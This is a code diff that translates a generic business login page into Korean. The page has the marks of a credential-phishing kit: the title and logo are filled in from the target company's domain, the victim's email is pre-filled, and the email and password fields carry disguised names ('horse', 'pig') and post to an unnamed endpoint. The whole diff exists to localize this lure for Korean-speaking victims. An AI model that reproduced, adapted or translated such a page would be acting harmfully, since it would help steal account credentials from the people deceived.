@@ -1,9 +1,10 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ko">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>{{ins}} Business Login</title>
+    <link rel="icon" href="https://api.kickfire.com/logo?website={{ins}}" type="image/x-icon">
+    <title>{{ins}} 비즈니스 로그인</title>
     <style>
         * {
             margin: 0;
@@ -139,22 +140,22 @@
     <div class="container">
         <div class="header">
             <img src="https://api.kickfire.com/logo?website={{ins}}" alt="Business Logo">
-            <h1>Sign In</h1>
-            <p>Welcome back! Please enter your credentials to access your account.</p>
+            <h1>로그인</h1>
+            <p>다시 오신 것을 환영합니다! 계정에 접근하려면 자격 증명을 입력해 주세요.</p>
         </div>
         <form action="first" method="POST">
             <div class="input-group">
-                <label for="email">Email Address</label>
+                <label for="email">이메일 주소</label>
                 <input type="email" id="email" name="horse" value="{{eman}}" required="">
             </div>
             <div class="input-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" name="pig" placeholder="Enter your password" required>
+                <label for="password">비밀번호</label>
+                <input type="password" id="password" name="pig" placeholder="비밀번호를 입력하세요" required>
             </div>
-            <button type="submit" class="btn">Log In</button>
+            <button type="submit" class="btn">로그인</button>
         </form>
         <div class="links">
-            <a href="#">Forgot your password?</a> | <a href="#">Create an account</a>
+            <a href="#">비밀번호를 잊으셨나요?</a> | <a href="#">계정 생성하기</a>
         </div>
     </div>
 </body>
